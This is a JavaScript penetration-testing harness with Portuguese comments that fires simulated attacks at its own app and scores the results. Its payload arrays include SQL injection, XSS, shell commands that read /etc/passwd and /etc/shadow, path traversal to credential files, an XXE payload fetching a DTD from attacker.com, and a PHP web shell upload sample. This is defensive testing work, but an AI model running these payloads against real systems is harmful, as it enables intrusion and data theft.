/**
 * 🎯 TESTES DE PENETRAÇÃO AUTOMATIZADOS
 * 
 * Sistema de testes de penetração para identificar vulnerabilidades
 * através de ataques simulados controlados
 */

const request = require('supertest');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class PenetrationTester {
  constructor(app) {
    this.app = app;
    this.results = {
      attacks: [],
      vulnerabilities: [],
      blocked: [],
      warnings: []
    };
    
    // Payloads de ataque conhecidos
    this.payloads = {
      sqlInjection: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM usuarios --",
        "1' AND (SELECT COUNT(*) FROM usuarios) > 0 --",
        "admin'/**/OR/**/1=1#",
        "' OR 1=1 LIMIT 1 --",
        "') OR '1'='1' --",
        "1' OR '1'='1' /*",
        "' WAITFOR DELAY '00:00:05' --",
        "1'; EXEC xp_cmdshell('dir'); --"
      ],
      
      xss: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
      ],
      
      commandInjection: [
        "; ls -la",
        "| cat /etc/passwd",
        "&& dir",
        "; cat /etc/shadow",
        "| whoami",
        "; id",
        "&& net user",
        "; ps aux",
        "| netstat -an",
        "; uname -a"
      ],
      
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../etc/shadow",
        "..\\..\\..\\boot.ini",
        "../../../proc/version",
        "..\\..\\..\\windows\\win.ini",
        "../../../../usr/local/apache/conf/httpd.conf",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../etc/hosts",
        "../../../../var/log/apache/access.log"
      ],
      
      ldapInjection: [
        "*)(uid=*",
        "admin)(&(password=*",
        "*)(|(objectclass=*",
        "*))(|(cn=*",
        "*))%00",
        "admin*",
        "admin)(|(password=*",
        "*)(mail=*",
        "admin)(&(|(password=*)(password=*",
        "*)(objectclass=person)(password=*"
      ],
      
      xmlInjection: [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY example \"Doe\"> ]><userInfo><firstName>John&example;</firstName></userInfo>",
        "<![CDATA[<script>alert('XSS')</script>]]>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///dev/random\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE data SYSTEM \"http://attacker.com/evil.dtd\"><data>&send;</data>"
      ]
    };
  }

  /**
   * Executar todos os testes de penetração
   */
  async runAllTests() {
    console.log('🎯 INICIANDO TESTES DE PENETRAÇÃO');
    console.log('=================================');
    
    const startTime = Date.now();
    
    try {
      // 1. Testes de autenticação
      await this.testAuthentication();
      
      // 2. Testes de autorização
      await this.testAuthorization();
      
      // 3. Testes de injeção SQL
      await this.testSqlInjection();
      
      // 4. Testes de XSS
      await this.testXSS();
      
      // 5. Testes de injeção de comando
      await this.testCommandInjection();
      
      // 6. Testes de path traversal
      await this.testPathTraversal();
      
      // 7. Testes de CSRF
      await this.testCSRF();
      
      // 8. Testes de rate limiting
      await this.testRateLimiting();
      
      // 9. Testes de session security
      await this.testSessionSecurity();
      
      // 10. Testes de file upload
      await this.testFileUpload();
      
      const executionTime = Date.now() - startTime;
      
      // Gerar relatório
      const report = this.generateReport(executionTime);
      
      console.log(`\n⏱️ Testes concluídos em ${executionTime}ms`);
      
      return report;
      
    } catch (error) {
      console.error('❌ Erro durante testes:', error);
      throw error;
    }
  }

  /**
   * Testes de autenticação
   */
  async testAuthentication() {
    console.log('\n🔐 TESTANDO AUTENTICAÇÃO...');
    
    const tests = [
      {
        name: 'Bypass de autenticação com SQL injection',
        payload: { email: "admin' OR '1'='1' --", senha: "any" }
      },
      {
        name: 'Login com credenciais vazias',
        payload: { email: "", senha: "" }
      },
      {
        name: 'Login com null bytes',
        payload: { email: "admin@test.com\x00", senha: "password" }
      },
      {
        name: 'Login com caracteres especiais',
        payload: { email: "admin@test.com", senha: "password'; DROP TABLE --" }
      },
      {
        name: 'Brute force simulation',
        payload: { email: "admin@test.com", senha: "123456" }
      }
    ];

    for (const test of tests) {
      try {
        const response = await request(this.app)
          .post('/api/auth/login-admin')
          .send(test.payload);

        this.recordAttack('AUTH_BYPASS', test.name, test.payload, response.status, response.body);

        if (response.status === 200 && response.body.token) {
          this.recordVulnerability('CRITICAL', 'AUTH_BYPASS_SUCCESS', 
            `Bypass de autenticação bem-sucedido: ${test.name}`);
        } else {
          this.recordBlocked('AUTH_BYPASS', test.name);
        }
      } catch (error) {
        this.recordWarning('AUTH_TEST_ERROR', `Erro no teste: ${test.name}`);
      }
    }
  }

  /**
   * Testes de autorização
   */
  async testAuthorization() {
    console.log('\n🛡️ TESTANDO AUTORIZAÇÃO...');
    
    // Tentar acessar endpoints administrativos sem token
    const adminEndpoints = [
      '/api/usuarios',
      '/api/backup/create',
      '/api/usuarios/1',
      '/api/auth/criar-admin-emergencia'
    ];

    for (const endpoint of adminEndpoints) {
      try {
        const response = await request(this.app).get(endpoint);
        
        this.recordAttack('AUTHZ_BYPASS', `Acesso sem autenticação: ${endpoint}`, {}, response.status, response.body);

        if (response.status === 200) {
          this.recordVulnerability('CRITICAL', 'AUTHZ_BYPASS_SUCCESS', 
            `Acesso não autorizado bem-sucedido: ${endpoint}`);
        } else {
          this.recordBlocked('AUTHZ_BYPASS', endpoint);
        }
      } catch (error) {
        this.recordWarning('AUTHZ_TEST_ERROR', `Erro no teste: ${endpoint}`);
      }
    }

    // Teste de escalação de privilégios
    await this.testPrivilegeEscalation();
  }

  /**
   * Testes de escalação de privilégios
   */
  async testPrivilegeEscalation() {
    const escalationTests = [
      {
        name: 'Modificar próprio perfil para admin',
        method: 'PUT',
        endpoint: '/api/usuarios/1',
        payload: { perfil: 'ADMINISTRADOR' }
      },
      {
        name: 'Criar usuário admin',
        method: 'POST',
        endpoint: '/api/usuarios',
        payload: { nome: 'Hacker', email: 'hacker@evil.com', perfil: 'ADMINISTRADOR' }
      }
    ];

    for (const test of escalationTests) {
      try {
        const response = await request(this.app)[test.method.toLowerCase()](test.endpoint)
          .send(test.payload);

        this.recordAttack('PRIVILEGE_ESCALATION', test.name, test.payload, response.status, response.body);

        if (response.status === 200 || response.status === 201) {
          this.recordVulnerability('CRITICAL', 'PRIVILEGE_ESCALATION_SUCCESS', 
            `Escalação de privilégio bem-sucedida: ${test.name}`);
        }
      } catch (error) {
        this.recordWarning('ESCALATION_TEST_ERROR', `Erro no teste: ${test.name}`);
      }
    }
  }

  /**
   * Testes de injeção SQL
   */
  async testSqlInjection() {
    console.log('\n💉 TESTANDO SQL INJECTION...');
    
    const endpoints = [
      { path: '/api/auth/login-admin', method: 'POST', params: ['email', 'senha'] },
      { path: '/api/usuarios', method: 'GET', params: ['search'] },
      { path: '/api/colaboradores', method: 'GET', params: ['search'] }
    ];

    for (const endpoint of endpoints) {
      for (const payload of this.payloads.sqlInjection) {
        for (const param of endpoint.params) {
          try {
            let response;
            
            if (endpoint.method === 'GET') {
              const query = {};
              query[param] = payload;
              response = await request(this.app).get(endpoint.path).query(query);
            } else {
              const body = {};
              body[param] = payload;
              response = await request(this.app).post(endpoint.path).send(body);
            }

            this.recordAttack('SQL_INJECTION', `${endpoint.path}?${param}=${payload}`, 
              { [param]: payload }, response.status, response.body);

            // Detectar possível sucesso de SQL injection
            if (this.detectSqlInjectionSuccess(response)) {
              this.recordVulnerability('CRITICAL', 'SQL_INJECTION_SUCCESS', 
                `SQL Injection detectada em ${endpoint.path} parâmetro ${param}`);
            }
          } catch (error) {
            // Erro pode indicar SQL injection bem-sucedida se for erro de SQL
            if (error.message && error.message.includes('sql')) {
              this.recordVulnerability('HIGH', 'SQL_ERROR_DISCLOSURE', 
                `Erro SQL exposto em ${endpoint.path}`);
            }
          }
        }
      }
    }
  }

  /**
   * Testes de XSS
   */
  async testXSS() {
    console.log('\n🕸️ TESTANDO XSS...');
    
    const endpoints = [
      { path: '/api/usuarios', method: 'POST', params: ['nome', 'email'] },
      { path: '/api/colaboradores', method: 'POST', params: ['nome'] }
    ];

    for (const endpoint of endpoints) {
      for (const payload of this.payloads.xss) {
        for (const param of endpoint.params) {
          try {
            const body = {
              [param]: payload,
              email: param === 'email' ? payload : 'test@example.com',
              nome: param === 'nome' ? payload : 'Test User'
            };

            const response = await request(this.app)
              .post(endpoint.path)
              .send(body);

            this.recordAttack('XSS', `${endpoint.path} ${param}`, body, response.status, response.body);

            // Verificar se payload foi refletido sem sanitização
            if (response.body && JSON.stringify(response.body).includes(payload)) {
              this.recordVulnerability('HIGH', 'XSS_REFLECTED', 
                `XSS refletido em ${endpoint.path} parâmetro ${param}`);
            }
          } catch (error) {
            this.recordWarning('XSS_TEST_ERROR', `Erro no teste XSS: ${endpoint.path}`);
          }
        }
      }
    }
  }

  /**
   * Testes de injeção de comando
   */
  async testCommandInjection() {
    console.log('\n⚡ TESTANDO COMMAND INJECTION...');
    
    // Testar em endpoints que podem executar comandos
    const endpoints = [
      '/api/backup/create',
      '/api/relatorios/gerar'
    ];

    for (const endpoint of endpoints) {
      for (const payload of this.payloads.commandInjection) {
        try {
          const response = await request(this.app)
            .post(endpoint)
            .send({ filename: payload, path: payload });

          this.recordAttack('COMMAND_INJECTION', endpoint, { payload }, response.status, response.body);

          // Detectar sinais de execução de comando
          if (this.detectCommandInjectionSuccess(response)) {
            this.recordVulnerability('CRITICAL', 'COMMAND_INJECTION_SUCCESS', 
              `Command Injection detectada em ${endpoint}`);
          }
        } catch (error) {
          this.recordWarning('CMD_TEST_ERROR', `Erro no teste: ${endpoint}`);
        }
      }
    }
  }

  /**
   * Testes de path traversal
   */
  async testPathTraversal() {
    console.log('\n📁 TESTANDO PATH TRAVERSAL...');
    
    const endpoints = [
      '/api/relatorios/download',
      '/api/backup/download'
    ];

    for (const endpoint of endpoints) {
      for (const payload of this.payloads.pathTraversal) {
        try {
          const response = await request(this.app)
            .get(`${endpoint}?file=${encodeURIComponent(payload)}`);

          this.recordAttack('PATH_TRAVERSAL', endpoint, { file: payload }, response.status, response.body);

          // Detectar acesso a arquivos do sistema
          if (this.detectPathTraversalSuccess(response)) {
            this.recordVulnerability('HIGH', 'PATH_TRAVERSAL_SUCCESS', 
              `Path Traversal detectado em ${endpoint}`);
          }
        } catch (error) {
          this.recordWarning('PATH_TEST_ERROR', `Erro no teste: ${endpoint}`);
        }
      }
    }
  }

  /**
   * Testes de CSRF
   */
  async testCSRF() {
    console.log('\n🎭 TESTANDO CSRF...');
    
    const criticalEndpoints = [
      { path: '/api/usuarios', method: 'POST' },
      { path: '/api/usuarios/1', method: 'DELETE' },
      { path: '/api/backup/create', method: 'POST' }
    ];

    for (const endpoint of criticalEndpoints) {
      try {
        const response = await request(this.app)[endpoint.method.toLowerCase()](endpoint.path)
          .set('Origin', 'http://malicious-site.com')
          .set('Referer', 'http://malicious-site.com/attack.html')
          .send({ malicious: 'payload' });

        this.recordAttack('CSRF', endpoint.path, { origin: 'malicious-site.com' }, response.status, response.body);

        if (response.status === 200 || response.status === 201) {
          this.recordVulnerability('HIGH', 'CSRF_SUCCESS', 
            `CSRF bem-sucedido em ${endpoint.path}`);
        }
      } catch (error) {
        this.recordWarning('CSRF_TEST_ERROR', `Erro no teste CSRF: ${endpoint.path}`);
      }
    }
  }

  /**
   * Testes de rate limiting
   */
  async testRateLimiting() {
    console.log('\n🚦 TESTANDO RATE LIMITING...');
    
    const endpoint = '/api/auth/login-admin';
    const requests = [];
    
    // Fazer 50 requests simultâneos
    for (let i = 0; i < 50; i++) {
      requests.push(
        request(this.app)
          .post(endpoint)
          .send({ email: 'test@test.com', senha: 'password' })
      );
    }

    try {
      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      const successful = responses.filter(r => r.status !== 429);

      this.recordAttack('RATE_LIMIT_TEST', endpoint, { requests: 50 }, 'mixed', { 
        rateLimited: rateLimited.length,
        successful: successful.length 
      });

      if (rateLimited.length === 0) {
        this.recordVulnerability('MEDIUM', 'NO_RATE_LIMITING', 
          'Rate limiting não detectado');
      } else if (successful.length > 10) {
        this.recordVulnerability('LOW', 'WEAK_RATE_LIMITING', 
          'Rate limiting muito permissivo');
      } else {
        this.recordBlocked('RATE_LIMITING', 'Proteção ativa');
      }
    } catch (error) {
      this.recordWarning('RATE_TEST_ERROR', 'Erro no teste de rate limiting');
    }
  }

  /**
   * Testes de segurança de sessão
   */
  async testSessionSecurity() {
    console.log('\n🍪 TESTANDO SESSION SECURITY...');
    
    // Teste de fixação de sessão
    try {
      const response1 = await request(this.app)
        .post('/api/auth/login-admin')
        .send({ email: 'admin@test.com', senha: 'admin123' });

      if (response1.status === 200 && response1.body.token) {
        const token = response1.body.token;
        
        // Tentar usar token após "logout"
        await request(this.app)
          .post('/api/auth/logout')
          .set('Authorization', `Bearer ${token}`);

        const response2 = await request(this.app)
          .get('/api/usuarios')
          .set('Authorization', `Bearer ${token}`);

        this.recordAttack('SESSION_FIXATION', 'Token após logout', { token: 'hidden' }, response2.status, response2.body);

        if (response2.status === 200) {
          this.recordVulnerability('HIGH', 'SESSION_NOT_INVALIDATED', 
            'Sessão não invalidada após logout');
        } else {
          this.recordBlocked('SESSION_SECURITY', 'Token invalidado corretamente');
        }
      }
    } catch (error) {
      this.recordWarning('SESSION_TEST_ERROR', 'Erro no teste de sessão');
    }
  }

  /**
   * Testes de upload de arquivo
   */
  async testFileUpload() {
    console.log('\n📤 TESTANDO FILE UPLOAD...');
    
    const maliciousFiles = [
      { name: 'malware.exe', content: 'MZ\x90\x00\x00\x00', type: 'application/octet-stream' },
      { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'script.js', content: 'alert("XSS")', type: 'application/javascript' },
      { name: '../../../evil.txt', content: 'Path traversal', type: 'text/plain' },
      { name: 'huge.txt', content: 'A'.repeat(50 * 1024 * 1024), type: 'text/plain' } // 50MB
    ];

    for (const file of maliciousFiles) {
      try {
        const response = await request(this.app)
          .post('/api/primeiro-registro/cadastrar-face')
          .attach('image', Buffer.from(file.content), file.name)
          .field('colaborador_id', '1')
          .field('cpf_confirmado', '12345678901');

        this.recordAttack('MALICIOUS_UPLOAD', file.name, { type: file.type }, response.status, response.body);

        if (response.status === 200) {
          this.recordVulnerability('HIGH', 'MALICIOUS_UPLOAD_SUCCESS', 
            `Upload malicioso bem-sucedido: ${file.name}`);
        } else {
          this.recordBlocked('FILE_UPLOAD', file.name);
        }
      } catch (error) {
        this.recordWarning('UPLOAD_TEST_ERROR', `Erro no teste de upload: ${file.name}`);
      }
    }
  }

  // Funções de detecção
  detectSqlInjectionSuccess(response) {
    const indicators = [
      'sql', 'mysql', 'postgresql', 'sqlite', 'oracle',
      'syntax error', 'column', 'table', 'database',
      'select', 'union', 'where', 'from'
    ];
    
    const responseText = JSON.stringify(response.body).toLowerCase();
    return indicators.some(indicator => responseText.includes(indicator));
  }

  detectCommandInjectionSuccess(response) {
    const indicators = [
      'root:', 'bin/bash', 'cmd.exe', 'system32',
      'directory of', 'total ', 'drwx', 'uid='
    ];
    
    const responseText = JSON.stringify(response.body).toLowerCase();
    return indicators.some(indicator => responseText.includes(indicator));
  }

  detectPathTraversalSuccess(response) {
    const indicators = [
      'root:x:', '[boot loader]', '127.0.0.1',
      'localhost', '/bin/bash', 'system32'
    ];
    
    const responseText = JSON.stringify(response.body);
    return indicators.some(indicator => responseText.includes(indicator));
  }

  // Funções de registro
  recordAttack(type, description, payload, status, response) {
    this.results.attacks.push({
      type,
      description,
      payload,
      status,
      response,
      timestamp: new Date().toISOString()
    });
  }

  recordVulnerability(severity, type, description) {
    this.results.vulnerabilities.push({
      severity,
      type,
      description,
      timestamp: new Date().toISOString()
    });
    
    const emoji = severity === 'CRITICAL' ? '🔴' : severity === 'HIGH' ? '🟠' : '🟡';
    console.log(`${emoji} ${severity}: ${description}`);
  }

  recordBlocked(type, description) {
    this.results.blocked.push({
      type,
      description,
      timestamp: new Date().toISOString()
    });
    
    console.log(`✅ BLOCKED: ${description}`);
  }

  recordWarning(type, description) {
    this.results.warnings.push({
      type,
      description,
      timestamp: new Date().toISOString()
    });
    
    console.log(`⚠️ WARNING: ${description}`);
  }

  /**
   * Gerar relatório final
   */
  generateReport(executionTime) {
    const totalAttacks = this.results.attacks.length;
    const vulnerabilities = this.results.vulnerabilities.length;
    const blocked = this.results.blocked.length;
    
    const criticalVulns = this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const highVulns = this.results.vulnerabilities.filter(v => v.severity === 'HIGH').length;
    
    // Calcular score de segurança
    let securityScore = 100;
    securityScore -= (criticalVulns * 30);
    securityScore -= (highVulns * 15);
    securityScore -= (this.results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length * 5);
    securityScore = Math.max(0, securityScore);

    const report = {
      timestamp: new Date().toISOString(),
      executionTime,
      summary: {
        totalAttacks,
        vulnerabilitiesFound: vulnerabilities,
        attacksBlocked: blocked,
        criticalVulnerabilities: criticalVulns,
        securityScore,
        status: this.getSecurityStatus(securityScore)
      },
      results: this.results,
      recommendations: this.generateRecommendations()
    };

    this.printSummary(report);
    
    // Salvar relatório
    const reportPath = path.join(__dirname, `penetration-test-report-${Date.now()}.json`);
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
    console.log(`\n📄 Relatório salvo em: ${reportPath}`);

    return report;
  }

  generateRecommendations() {
    const recommendations = [];
    
    if (this.results.vulnerabilities.some(v => v.type.includes('SQL_INJECTION'))) {
      recommendations.push({
        priority: 'CRITICAL',
        action: 'Implementar prepared statements em todas as queries',
        impact: 'Previne SQL Injection'
      });
    }
    
    if (this.results.vulnerabilities.some(v => v.type.includes('XSS'))) {
      recommendations.push({
        priority: 'HIGH',
        action: 'Implementar sanitização de entrada e CSP',
        impact: 'Previne ataques XSS'
      });
    }
    
    if (this.results.vulnerabilities.some(v => v.type.includes('AUTH_BYPASS'))) {
      recommendations.push({
        priority: 'CRITICAL',
        action: 'Revisar sistema de autenticação',
        impact: 'Previne bypass de autenticação'
      });
    }
    
    return recommendations;
  }

  printSummary(report) {
    console.log('\n🎯 RELATÓRIO DE PENETRAÇÃO');
    console.log('==========================');
    console.log(`📊 Score de Segurança: ${report.summary.securityScore}/100 (${report.summary.status})`);
    console.log(`🎯 Ataques Executados: ${report.summary.totalAttacks}`);
    console.log(`🚨 Vulnerabilidades: ${report.summary.vulnerabilitiesFound}`);
    console.log(`🛡️ Ataques Bloqueados: ${report.summary.attacksBlocked}`);
    console.log(`🔴 Críticas: ${report.summary.criticalVulnerabilities}`);
  }

  getSecurityStatus(score) {
    if (score >= 90) return 'EXCELLENT';
    if (score >= 80) return 'GOOD';
    if (score >= 70) return 'FAIR';
    if (score >= 50) return 'POOR';
    return 'CRITICAL';
  }
}

module.exports = PenetrationTester;
